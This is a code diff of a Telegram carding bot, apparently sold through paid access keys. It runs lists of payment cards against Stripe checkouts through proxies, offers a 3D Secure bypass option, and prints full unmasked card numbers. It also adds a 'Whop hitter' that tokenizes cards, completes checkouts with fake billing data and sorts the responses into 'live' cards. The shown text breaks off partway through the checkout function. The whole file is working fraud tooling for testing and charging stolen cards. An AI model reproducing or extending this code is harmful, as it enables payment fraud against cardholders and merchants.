+                cancelled = True
+                break
+        
+        result = await charge_card_stripe(card, checkout_data, user_proxy, bypass_3ds)
+        results.append(result)
+        
+        if len(cards) > 1 and (time.perf_counter() - last_update) > 1.5:
+            last_update = time.perf_counter()
+            charged = sum(1 for r in results if r['status'] == 'CHARGED')
+            declined = sum(1 for r in results if r['status'] == 'DECLINED')
+            three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
+            errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED'])
+            
+            try:
+                await processing_msg.edit_text(
+                    f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Charging {price_str}</b>\n\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['target'], '📍')} <b>Proxy</b> ➛ <code>{proxy_display}</code>\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['lock'], '🔓')} <b>Bypass</b> ➛ <code>{bypass_str}</code>\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➛ <code>{i+1}/{len(cards)}</code>\n\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>Charged</b> ➛ <code>{charged} ✅</code>\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>Declined</b> ➛ <code>{declined} ❌</code>\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['lock'], '🔐')} <b>3DS</b> ➛ <code>{three_ds} 🔐</code>\n"
+                    f"{pe(PREMIUM_EMOJI_IDS['error'], '⚠️')} <b>Errors</b> ➛ <code>{errors} ⚠️</code>",
+                    parse_mode=ParseMode.HTML
+                )
+            except:
+                pass
+        
+        if result['status'] == 'CHARGED':
+            charged_card = result
+            break
+    
+    total_time = round(time.perf_counter() - start_time, 2)
+    
+    # Build final response with Premium emojis - FULL CARD NO MASKING
+    response = f"┏━━━━━━━⍟\n"
+    response += f"┃ {pe(PREMIUM_EMOJI_IDS['diamond'], '💳')} <b>Stripe Charge Result</b>\n"
+    response += f"┗━━━━━━━━━━━⊛\n\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['target'], '📍')} <b>Proxy</b> ➛ {proxy_display}\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['bank'], '🏦')} <b>Merchant</b> ➛ {checkout_data['merchant'] or 'N/A'}\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Product</b> ➛ {checkout_data['product'] or 'N/A'}\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Price</b> ➛ {price_str}\n"
+
+    
+    if cancelled:
+        response += f"{pe(PREMIUM_EMOJI_IDS['warning'], '⛔')} <b>Checkout Cancelled</b>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['info'], '📝')} <b>Reason</b> ➛ Checkout no longer active\n\n"
+        
+        charged = sum(1 for r in results if r['status'] == 'CHARGED')
+        declined = sum(1 for r in results if r['status'] == 'DECLINED')
+        three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
+        
+        response += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Tried</b> ➛ {len(results)}/{len(cards)} cards\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>Charged</b> ➛ {charged} \n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>Declined</b> ➛ {declined} \n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['lock'], '🔐')} <b>3DS</b> ➛ {three_ds} "
+    
+    elif charged_card:
+        response += f"{pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>CHARGED</b>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Card</b> ➛ <code>{charged_card['card']}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['info'], '📝')} <b>Response</b> ➛ {charged_card['response']}\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} <b>Time</b> ➛ {charged_card['time']}s\n\n"
+        
+        if checkout_data.get('success_url'):
+            response += f"{pe(PREMIUM_EMOJI_IDS['target'], '🔗')} <a href=\"{checkout_data['success_url']}\">Open Success Page</a>\n\n"
+        
+        if len(results) > 1:
+            response += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Tried</b> ➛ {len(results)}/{len(cards)} cards"
+    
+    elif len(results) == 1:
+        r = results[0]
+        if r['status'] == '3DS':
+            status_emoji = pe(PREMIUM_EMOJI_IDS['lock'], '🔐')
+            status_text = "3DS REQUIRED"
+        elif r['status'] == '3DS SKIP':
+            status_emoji = pe(PREMIUM_EMOJI_IDS['lock'], '🔓')
+            status_text = "3DS SKIP"
+        elif r['status'] == 'DECLINED':
+            status_emoji = pe(PREMIUM_EMOJI_IDS['declined'], '❌')
+            status_text = "DECLINED"
+        elif r['status'] == 'NOT SUPPORTED':
+            status_emoji = pe(PREMIUM_EMOJI_IDS['warning'], '🚫')
+            status_text = "NOT SUPPORTED"
+        else:
+            status_emoji = pe(PREMIUM_EMOJI_IDS['error'], '⚠️')
+            status_text = r['status']
+        
+        response += f"{status_emoji} <b>{status_text}</b>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Card</b> ➛ <code>{r['card']}</code>\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['info'], '📝')} <b>Response</b> ➛ {r['response']}\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} <b>Time</b> ➛ {r['time']}s"
+    
+    else:
+        charged = sum(1 for r in results if r['status'] == 'CHARGED')
+        declined = sum(1 for r in results if r['status'] == 'DECLINED')
+        three_ds = sum(1 for r in results if r['status'] in ['3DS', '3DS SKIP'])
+        errors = sum(1 for r in results if r['status'] in ['ERROR', 'FAILED', 'UNKNOWN'])
+        total = len(results)
+        
+        response += f"{pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>Charged</b> ➛ {charged}/{total}\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>Declined</b> ➛ {declined}/{total}\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['lock'], '🔐')} <b>3DS</b> ➛ {three_ds}/{total}\n"
+        if errors > 0:
+            response += f"{pe(PREMIUM_EMOJI_IDS['error'], '⚠️')} <b>Errors</b> ➛ {errors}/{total}\n"
+        
+        if results:
+            response += f"\n{pe(PREMIUM_EMOJI_IDS['card'], '💳')} <b>Sample Card</b> ➛ <code>{results[0]['card']}</code>"
+    
+    
+    await processing_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 # ============ UPDATED PROXY MANAGER WITH API-SPECIFIC POOLS ============
 
 class ProxyManager:
@@ -41271,29 +42538,31 @@ async def stripe_4usd_mass_check_logic(update: Update, context: ContextTypes.DEF
 # Add this to your f13.py
 
 async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Generate a new redeem key - /genkey <plan> <duration><unit>
+    """Generate a new redeem key - /genkey <plan> <duration><unit> [max_uses]
     
     Examples:
-    /genkey premium 1h  - 1 hour Premium
-    /genkey premium 6h  - 6 hours Premium
-    /genkey ultimate 2h - 2 hours Ultimate
+    /genkey premium 1h  - 1 hour Premium (1 use)
+    /genkey premium 6h  - 6 hours Premium (1 use)
+    /genkey ultimate 2h 100 - 2 hours Ultimate (100 uses)
+    /genkey premium 7d 50 - 7 days Premium (50 uses)
     """
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ Admin only command.")
         return
     
     args = context.args
-    if len(args) != 2:
+    if len(args) < 2:
         await update.message.reply_text(
             "🔑 <b>Generate Key</b>\n\n"
-            "Usage: <code>/genkey &lt;plan&gt; &lt;duration&gt;&lt;unit&gt;</code>\n\n"
+            "Usage: <code>/genkey &lt;plan&gt; &lt;duration&gt;&lt;unit&gt; [max_uses]</code>\n\n"
             "<b>Plans:</b> free, premium, ultimate, admin\n\n"
             "<b>Examples:</b>\n"
-            "• <code>/genkey premium 1h</code> - 1 hour Premium\n"
-            "• <code>/genkey premium 6h</code> - 6 hours Premium\n"
-            "• <code>/genkey ultimate 2h</code> - 2 hours Ultimate\n"
-            "• <code>/genkey premium 7d</code> - 7 days Premium\n\n"
-            "📌 <b>Hourly keys</b> are great for testing!",
+            "• <code>/genkey premium 1h</code> - 1 hour Premium (1 use)\n"
+            "• <code>/genkey premium 6h</code> - 6 hours Premium (1 use)\n"
+            "• <code>/genkey ultimate 2h 100</code> - 2 hours Ultimate (100 uses)\n"
+            "• <code>/genkey premium 7d 50</code> - 7 days Premium (50 uses)\n"
+            "• <code>/genkey ultimate 30d 1000</code> - 30 days Ultimate (1000 uses)\n\n"
+            "📌 <b>Max Uses</b>: Number of times the key can be redeemed (default: 1)",
             parse_mode=ParseMode.HTML
         )
         return
@@ -41301,6 +42570,21 @@ async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         tier = args[0].lower()
         duration_input = args[1].lower()
+        
+        # Parse max_uses (optional)
+        max_uses = 1
+        if len(args) >= 3:
+            try:
+                max_uses = int(args[2])
+                if max_uses < 1:
+                    await update.message.reply_text("❌ Max uses must be at least 1.")
+                    return
+                if max_uses > 1000000:
+                    await update.message.reply_text("❌ Max uses cannot exceed 1,000,000.")
+                    return
+            except ValueError:
+                await update.message.reply_text("❌ Invalid max uses value. Please use a number.")
+                return
         
         # Parse duration (e.g., "1h", "6h", "7d", "30d")
         if duration_input.endswith('h'):
@@ -41341,10 +42625,12 @@ async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Calculate expiry
         if duration_type == 'hours':
             expiry = time.time() + (duration * 3600)
+            expiry_days = duration / 24
         else:
             expiry = time.time() + (duration * 86400) if duration > 0 else 0
+            expiry_days = duration
         
-        # Save key
+        # Save key with max_uses
         key_manager.keys[key] = {
             "tier": tier,
             "duration": duration,
@@ -41352,9 +42638,11 @@ async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "expiry": expiry,
             "created_by": update.effective_user.id,
             "created_at": time.time(),
-            "used_by": None,
-            "used_at": None,
-            "active": True
+            "used_by": [],
+            "used_at": [],
+            "active": True,
+            "max_uses": max_uses,
+            "uses_count": 0
         }
         key_manager.save_keys()
         
@@ -41366,14 +42654,19 @@ async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         plan_emoji = user_manager.TIERS[tier]['emoji']
         
+        # Build response with max uses
+        max_uses_display = f"🔋 𝗠𝗮𝘅 𝗨𝘀𝗲𝘀 ⌁ {max_uses}"
+        
         await update.message.reply_text(
             f"✅ <b>Key Generated!</b>\n\n"
             f"🔑 Key: <code>{key}</code>\n"
             f"🎯 Plan: {plan_emoji} {tier.upper()}\n"
             f"⏱️ Duration: {duration_text}\n"
+            f"{max_uses_display}\n"
             f"📅 Expires: {expiry_date}\n"
             f"━━━━━━━━━━━━━━━━━━━\n"
-            f"User can redeem with: <code>/redeem {key}</code>",
+            f"User can redeem with: <code>/redeem {key}</code>\n\n"
+            f"<i>🔑 This key can be used <b>{max_uses}</b> time{'s' if max_uses > 1 else ''}.</i>",
             parse_mode=ParseMode.HTML
         )
         
@@ -41383,126 +42676,13 @@ async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
 
 
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Redeem a key - /redeem <key>"""
-    if not await verify_group_access(update, context):
-        return
-    
-    user_id = update.effective_user.id
-    user = update.effective_user
-    
-    if not context.args:
-        await update.message.reply_text(
-            "🔑 <b>Redeem Key</b>\n\n"
-            "Usage: /redeem <key>\n"
-            "Example: /redeem XXXX-XXXX-XXXX-XXXX\n\n"
-            "Redeem a key to upgrade your tier.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-    
-    key = context.args[0].upper().strip()
-    
-    # Check if key exists
-    if key not in key_manager.keys:
-        await update.message.reply_text("❌ Invalid key.")
-        return
-    
-    key_data = key_manager.keys[key]
-    
-    # Check if already used
-    if key_data.get("used_by") is not None:
-        await update.message.reply_text("❌ This key has already been used.")
-        return
-    
-    # Check if active
-    if not key_data.get("active", True):
-        await update.message.reply_text("❌ This key has been deactivated.")
-        return
-    
-    # Check expiry
-    current_time = time.time()
-    if key_data.get("expiry", 0) > 0 and current_time > key_data["expiry"]:
-        key_data["active"] = False
-        key_manager.save_keys()
-        await update.message.reply_text("❌ This key has expired.")
-        return
-    
-    # Get key details
-    tier = key_data["tier"]
-    duration = key_data["duration"]
-    duration_type = key_data.get("duration_type", "days")
-    
-    # Format duration text
-    if duration_type == "hours":
-        duration_text = f"{duration} hour{'s' if duration > 1 else ''}"
-        expiry_seconds = duration * 3600
-    else:
-        duration_text = f"{duration} day{'s' if duration > 1 else ''}"
-        expiry_seconds = duration * 86400
-    
-    # Mark key as used
-    key_data["used_by"] = user_id
-    key_data["used_at"] = current_time
-    key_data["active"] = False
-    key_manager.save_keys()
-    
-    # Get user data
-    user_data = user_manager.get_user(user_id)
-    original_tier = user_data["tier"]
-    
-    # Update user's tier
-    user_data["tier"] = tier
-    user_data["upgraded_from"] = original_tier
-    user_data["tier_expiry"] = current_time + expiry_seconds
-    user_data["keys_redeemed"] = user_data.get("keys_redeemed", 0) + 1
-    
-    user_manager.save_users()
-    
-    # Update cache if exists
-    if hasattr(user_manager, 'cache') and user_id in user_manager.cache:
-        user_manager.cache[user_id] = user_data
-    
-    # Send confirmation
-    await update.message.reply_text(
-        f"✅ <b>Successfully activated {tier.upper()} for {duration_text}!</b>\n\n"
-        f"⏱️ <b>Duration:</b> {duration_text}\n",
-        parse_mode=ParseMode.HTML
-    )
-    
-    # Send notification
-    await send_hour_key_notification(
-        context=context,
-        user_id=user_id,
-        username=user.username or user.first_name,
-        first_name=user.first_name,
-        tier=tier,
-        duration=duration,
-        duration_type=duration_type
-    )
-    
-    print(f"✅ User {user_id} upgraded from {original_tier} to {tier} for {duration_text}")
 
 
-async def send_hour_key_notification(context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str, first_name: str, tier: str, duration: int, duration_type: str):
+async def send_hour_key_notification(context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str, first_name: str, tier: str, duration: int, duration_type: str, remaining_uses: int = None, max_uses: int = None):
     """Send notification for key activation with PREMIUM EMOJIS"""
     
     if not HIT_NOTIFICATION_ENABLED:
         return
-    
-    # ============ PREMIUM EMOJI IDs ============
-    PREMIUM_EMOJI_IDS = {
-        "skull": "5042167377869932162",
-        "target": "5377336227533969892",
-        "toy": "5249244862359812334",
-        "diamond": "5427168083074628963",
-        "flower": "6230927657257668107",
-        "pink": "5041796412954641308",
-        "doller": "5197434882321567830",
-        "fire": "5471133374264684999",
-        "clock": "5262540380301191210",
-        "id": "5307905813451397794",
-    }
     
     # Format duration
     if duration_type == "hours":
@@ -41526,26 +42706,27 @@ async def send_hour_key_notification(context: ContextTypes.DEFAULT_TYPE, user_id
     else:
         user_display = first_name
     
-    # Build notification with PREMIUM EMOJIS
+    # Build notification
     notification = (
         f'╔══════════════════════════╗\n'
-        f'      <tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["target"]}">🎯</tg-emoji> '
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji> '
-        f'𝑲𝒆𝒚 𝑨𝒄𝒕𝒊𝒗𝒂𝒕𝒆𝒅\n'
+        f'   💎💎💎 Key Activated\n'
         f'╚══════════════════════════╝\n\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["id"]}">👤</tg-emoji> <b>User</b> ➛ {user_display}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["target"]}">👑</tg-emoji> <b>Plan</b>  ➛ {plan_display}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["clock"]}">⏱️</tg-emoji> <b>Duration</b> ➛ {duration_text}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["skull"]}">💀</tg-emoji> <b>Bot</b> ➛ @BLADESARKS_V3bot'
+        f'👤 <b>User</b> ➛ {user_display}\n'
+        f'👑 <b>Plan</b>  ➛ {plan_display}\n'
+        f'⏱️ <b>Duration</b> ➛ {duration_text}'
     )
+    
+    # Add remaining uses if available
+    if remaining_uses is not None and max_uses is not None:
+        notification += f'\n🔋 <b>Remaining Uses</b> ➛ {remaining_uses}/{max_uses}'
+    
+    notification += f'\n💀 <b>Bot</b> ➛ @BLADESARKS_V3bot'
     
     try:
         await context.bot.send_message(
             chat_id=HIT_NOTIFICATION_GROUP_ID,
             text=notification,
-            parse_mode="HTML"
+            parse_mode=ParseMode.HTML
         )
         print(f"📢 Hour key notification sent for user {user_id}: {tier.upper()} - {duration_text}")
     except Exception as e:
@@ -54015,9 +55196,1671 @@ async def test_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = f"🧪 <b>Proxy Test Complete</b>\n\n✅ Working: {len(working)}\n❌ Failed: {len(failed)}"
     await query.edit_message_text(result, parse_mode=ParseMode.HTML, reply_markup=back_menu())
 
-# --- UI FUNCTIONS ---
+# ============ WHOP HITTER - COMPLETE WORKING VERSION ============
+# Add this to your f13.py
 
-# ============ SMART DORK FEATURE ============
+import re
+import json
+import time
+import uuid
+import asyncio
+import random
+from typing import Dict, Optional, List
+import httpx
+from faker import Faker
+from datetime import datetime
+
+# ============ CONFIGURATION ============
+WHOP_BASE_URL = "https://whop.com"
+
+# Active tasks
+whop_active_tasks = {}
+
+# ============ PROXY HELPER ============
+
+def format_proxy(raw_proxy: str) -> Optional[str]:
+    """Format proxy for httpx"""
+    if not raw_proxy:
+        return None
+    proxy = raw_proxy.replace('http://', '').replace('https://', '')
+    if '@' in proxy:
+        auth, hostport = proxy.split('@', 1)
+        if ':' in auth:
+            user, password = auth.split(':', 1)
+            return f"http://{user}:{password}@{hostport}"
+    parts = proxy.split(':')
+    if len(parts) == 4:
+        user, password, host, port = parts
+        return f"http://{user}:{password}@{host}:{port}"
+    if len(parts) == 2 and parts[1].isdigit():
+        return f"http://{proxy}"
+    return f"http://{proxy}"
+
+def mask_proxy(proxy: str) -> str:
+    """Mask proxy for display"""
+    if not proxy:
+        return "None"
+    try:
+        if '@' in proxy:
+            parts = proxy.split('@')
+            return f"***@{parts[1]}"
+        return "***.***.***.***:***"
+    except:
+        return "Proxy (masked)"
+
+# ============ TOKENIZE CARD USING BASIS THEORY ============
+
+async def tokenize_card_basis_theory(card: str, proxy: str = None) -> Optional[str]:
+    """Tokenize card using Basis Theory API"""
+    try:
+        parts = card.split('|')
+        if len(parts) != 4:
+            return None
+        
+        cc, mm, yy, cvv = parts
+        cc = cc.replace(' ', '')
+        
+        if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
+            print(f"❌ [Whop] Invalid card number: {cc[:6]}******{cc[-4:]}")
+            return None
+        
+        if len(yy) == 4:
+            yy = yy[2:]
+        
+        tokenize_url = "https://api.basistheory.com/tokenize"
+        
+        headers = {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json',
+            'BT-API-KEY': 'key_prod_us_pub_3gzPRk4Fuomp1aXof2qYWw',
+            'BT-REGION': 'us',
+        }
+        
+        payload = {
+            'type': 'card',
+            'data': {
+                'number': cc,
+                'expiration_month': mm.zfill(2),
+                'expiration_year': f'20{yy}',
+                'cvv': cvv,
+            }
+        }
+        
+        print(f"📤 [Whop] Tokenizing card: {cc[:6]}******{cc[-4:]}")
+        
+        client_kwargs = {
+            'timeout': httpx.Timeout(30.0, connect=10.0),
+            'verify': False,
+        }
+        
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.post(tokenize_url, headers=headers, json=payload)
+            
+            print(f"📥 [Whop] Tokenization Response: {response.status_code}")
+            
+            if response.status_code in [200, 201]:
+                result = response.json()
+                token = result.get('id')
+                if token:
+                    print(f"✅ [Whop] Card tokenized: {token}")
+                    return token
+                else:
+                    print(f"❌ [Whop] No token in response: {result}")
+                    return None
+            
+            print(f"❌ [Whop] Tokenization failed: {response.status_code}")
+            print(f"   Response: {response.text[:200]}")
+            return None
+            
+    except Exception as e:
+        print(f"❌ [Whop] Tokenization error: {e}")
+        return None
+
+# ============ EXTRACT CHECKOUT DATA FROM URL ============
+
+def extract_checkout_data_from_url(url: str) -> Dict:
+    """Extract checkout data from URL."""
+    data = {
+        'checkout_id': None,
+        'secret': None,
+        'full_url': url,
+    }
+    
+    # Extract checkout ID
+    match = re.search(r'/checkout/([^/?]+)', url)
+    if match:
+        checkout_id = match.group(1)
+        if not checkout_id.startswith('plan_'):
+            data['checkout_id'] = checkout_id
+            print(f"📋 Checkout ID: {checkout_id}")
+    
+    # Extract secret
+    secret_match = re.search(r'[?&]secret=([^&]+)', url)
+    if secret_match:
+        data['secret'] = secret_match.group(1)
+        print(f"🔑 Secret found: {data['secret'][:30]}...")
+    else:
+        print(f"⚠️ No secret found in URL - API calls will fail!")
+    
+    return data
+
+# ============ GENERATE A VALID CHECKOUT URL ============
+
+async def get_valid_checkout_url(product_id: str = "plan_FPtxpqtykEfI7", proxy: str = None) -> Optional[str]:
+    """
+    Generate a fresh checkout URL with a valid session and secret.
+    This visits the product page and extracts the checkout data.
+    """
+    try:
+        url = f"https://whop.com/buy-vip/?pass=prod_3SCTzxslKzIBU&plan={product_id}"
+        
+        client_kwargs = {
+            'timeout': httpx.Timeout(30.0, connect=10.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            print(f"📡 [Whop] Visiting product page...")
+            
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+            }
+            
+            response = await client.get(url, headers=headers)
+            
+            if response.status_code != 200:
+                print(f"❌ [Whop] Product page failed: {response.status_code}")
+                return None
+            
+            html = response.text
+            
+            # Look for checkout URL in the page
+            checkout_match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', html)
+            if checkout_match:
+                checkout_url = checkout_match.group(1)
+                print(f"✅ [Whop] Found checkout URL: {checkout_url[:80]}...")
+                return checkout_url
+            
+            # Look for checkout link
+            checkout_match = re.search(r'href="(/checkout/[^"]+)"', html)
+            if checkout_match:
+                checkout_path = checkout_match.group(1)
+                checkout_url = f"https://whop.com{checkout_path}"
+                print(f"✅ [Whop] Found checkout path: {checkout_url[:80]}...")
+                return checkout_url
+            
+            # Try to find the secret in the page
+            secret_match = re.search(r'"secret":"([^"]+)"', html)
+            if secret_match:
+                secret = secret_match.group(1)
+                print(f"🔑 Found secret in page: {secret[:30]}...")
+            
+            return None
+            
+    except Exception as e:
+        print(f"❌ [Whop] Error getting checkout URL: {e}")
+        return None
+
+# ============ GET CHECKOUT STATE ============
+
+async def get_checkout_state(checkout_id: str, secret: str, proxy: str = None) -> Optional[Dict]:
+    """Get the current checkout state."""
+    try:
+        api_url = f"https://whop.com/checkout/{checkout_id}/api/"
+        if secret:
+            api_url = f"{api_url}?secret={secret}"
+        
+        print(f"📡 [Whop] Getting checkout state...")
+        
+        headers = {
+            'Accept': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
+            'X-Requested-With': 'XMLHttpRequest',
+        }
+        
+        client_kwargs = {
+            'timeout': httpx.Timeout(30.0, connect=10.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.get(api_url, headers=headers)
+            
+            print(f"📥 [Whop] GET state: {response.status_code}")
+            
+            if response.status_code == 200:
+                return response.json()
+            else:
+                print(f"❌ [Whop] GET state failed: {response.status_code}")
+                print(f"   Response: {response.text[:200]}")
+                return None
+                
+    except Exception as e:
+        print(f"❌ [Whop] Error getting state: {e}")
+        return None
+
+# ============ PARSE WHOP ERRORS ============
+
+def parse_whop_errors(data: Dict) -> Tuple[Optional[str], Optional[str], Optional[str]]:
+    """
+    Parse Whop error response
+    Returns: (status, message, status_display)
+    """
+    errors = data.get('errors', {})
+    
+    if not errors:
+        return None, None, None
+    
+    error_messages = []
+    for error_id, error_data in errors.items():
+        if isinstance(error_data, dict):
+            if 'general' in error_data:
+                error_messages.extend(error_data['general'])
+    
+    if not error_messages:
+        # Check tasks for errors
+        tasks = data.get('tasks', [])
+        for task in tasks:
+            if task.get('status') == 'failed':
+                error_messages.append(task.get('message', 'Unknown error'))
+    
+    if not error_messages:
+        return None, None, None
+    
+    error_msg = ' | '.join(error_messages)
+    print(f"📥 [Whop] Error: {error_msg}")
+    
+    error_lower = error_msg.lower()
+    
+    # Check for specific error types
+    if 'insufficient funds' in error_lower or 'insufficient' in error_lower:
+        return 'approved', f'Insufficient funds: {error_msg}', '💰 INSUFFICIENT FUNDS'
+    elif 'card account has been closed' in error_lower:
+        return 'declined', f'Card closed: {error_msg}', '❌ CARD CLOSED'
+    elif 'declined' in error_lower:
+        return 'declined', f'Card declined: {error_msg}', '❌ DECLINED'
+    elif 'expired' in error_lower:
+        return 'declined', f'Expired card: {error_msg}', '❌ EXPIRED CARD'
+    elif 'cvv' in error_lower or 'security' in error_lower:
+        return 'approved', f'CVV error: {error_msg}', '✅ CVV LIVE'
+    elif '3d' in error_lower or 'secure' in error_lower or 'authentication' in error_lower:
+        return 'declined', f'3D Secure required: {error_msg}', '🔐 3DS REQUIRED'
+    elif 'fraud' in error_lower or 'risk' in error_lower:
+        return 'declined', f'Risk check failed: {error_msg}', '❌ RISK DECLINED'
+    else:
+        return 'declined', error_msg, '❌ DECLINED'
+
+# ============ COMPLETE WHOP CHECKOUT ============
+
+async def complete_whop_checkout(
+    checkout_id: str,
+    card_token: str,
+    billing_address: Dict,
+    secret: str,
+    proxy: str = None
+) -> Dict:
+    """
+    Complete the Whop checkout with proper session and error handling.
+    """
+    try:
+        # Build API URL with secret
+        api_url = f"https://whop.com/checkout/{checkout_id}/api/"
+        if secret:
+            api_url = f"{api_url}?secret={secret}"
+        else:
+            return {
+                'status': 'error',
+                'message': 'Missing secret parameter - checkout URL is invalid',
+                'status_display': '⚠️ MISSING SECRET',
+                'status_category': 'error'
+            }
+        
+        print(f"📡 [Whop] API URL: {api_url[:80]}...")
+        
+        headers = {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
+            'Origin': 'https://whop.com',
+            'Referer': f'https://whop.com/checkout/{checkout_id}/',
+            'X-Requested-With': 'XMLHttpRequest',
+        }
+        
+        client_kwargs = {
+            'timeout': httpx.Timeout(60.0, connect=15.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+                print(f"🔧 [Whop] Using proxy: {mask_proxy(proxy_url)}")
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            
+            # ============ STEP 1: GET current checkout state ============
+            get_response = await client.get(api_url, headers=headers)
+            
+            print(f"📥 [Whop] GET state: {get_response.status_code}")
+            
+            if get_response.status_code != 200:
+                return {
+                    'status': 'error',
+                    'message': f'Failed to get checkout state: HTTP {get_response.status_code}',
+                    'status_display': f'⚠️ HTTP {get_response.status_code}',
+                    'status_category': 'error'
+                }
+            
+            state = get_response.json()
+            print(f"📥 [Whop] Checkout state: {state.get('status')}, completed: {state.get('completed')}")
+            
+            # ============ STEP 2: Check for existing errors ============
+            status, error_msg, status_display = parse_whop_errors(state)
+            
+            if status:
+                print(f"📥 [Whop] Error from state: {error_msg}")
+                return {
+                    'status': status,
+                    'result': status_display,
+                    'message': error_msg,
+                    'status_display': status_display,
+                    'status_category': status,
+                    'data': state
+                }
+            
+            # ============ STEP 3: Check if already completed ============
+            if state.get('completed'):
+                print(f"✅ [Whop] Checkout already completed!")
+                return {
+                    'status': 'charged',
+                    'result': 'CHARGED',
+                    'message': 'Checkout already completed!',
+                    'status_display': '🔥 CHARGED 🔥',
+                    'status_category': 'charged',
+                    'data': state
+                }
+            
+            # ============ STEP 4: PATCH to complete checkout ============
+            print(f"📤 [Whop] Completing checkout via PATCH...")
+            
+            payload = {
+                'payment_method_token': card_token,
+                'billing_address': {
+                    'name': billing_address.get('name', 'John Doe'),
+                    'city': billing_address.get('city', 'New York'),
+                    'country': billing_address.get('country', 'US'),
+                    'line1': billing_address.get('line1', '123 Main St'),
+                    'line2': billing_address.get('line2', ''),
+                    'postal_code': billing_address.get('postalCode', '10001'),
+                    'state': billing_address.get('state', 'NY'),
+                },
+                'payment_method_type': 'card',
+                'payment_processor': 'multi_psp',
+            }
+            
+            patch_response = await client.patch(
+                api_url,
+                headers=headers,
+                json=payload
+            )
+            
